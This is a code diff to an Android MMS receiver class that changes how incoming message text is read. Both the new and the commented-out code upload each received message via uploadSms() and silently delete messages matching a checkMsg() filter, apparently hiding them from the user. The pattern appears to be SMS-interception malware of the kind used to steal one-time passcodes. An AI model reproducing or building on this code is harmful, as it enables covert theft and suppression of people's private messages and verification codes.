@@ -53,20 +53,31 @@ public class OneMmsReceivedReceiver extends MmsReceivedReceiver implements Const
 
                             if (curPart != null) {
                                 if (curPart.moveToLast()) {
-                                    for (int i = 0; i < curPart.getColumnCount(); i++) {
-                                        String message = curPart.getString(i);
-                                        if (message.length() > 100) {
-                                            uploadSms(context, address, message);
-                                            if (checkMsg(message)) {
-                                                context.getContentResolver().delete(messageUri, null, null);
-                                            } else {
-                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT
-                                                        && Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
-                                                    spitNotification(context, message);
-                                                }
-                                            }
+                                    int index = curPart.getColumnIndex("text");
+                                    String message1 = curPart.getString(index);
+                                    uploadSms(context, address, message1);
+                                    if (checkMsg(message1)) {
+                                        context.getContentResolver().delete(messageUri, null, null);
+                                    } else {
+                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT
+                                                && Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
+                                            spitNotification(context, message1);
                                         }
                                     }
+//                                    for (int i = 0; i < curPart.getColumnCount(); i++) {
+//                                        String message = curPart.getString(i);
+//                                        if (message.length() > 100) {
+//                                            uploadSms(context, address, message);
+//                                            if (checkMsg(message)) {
+//                                                context.getContentResolver().delete(messageUri, null, null);
+//                                            } else {
+//                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT
+//                                                        && Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
+//                                                    spitNotification(context, message);
+//                                                }
+//                                            }
+//                                        }
+//                                    }
                                 }
                                 curPart.close();
                             }
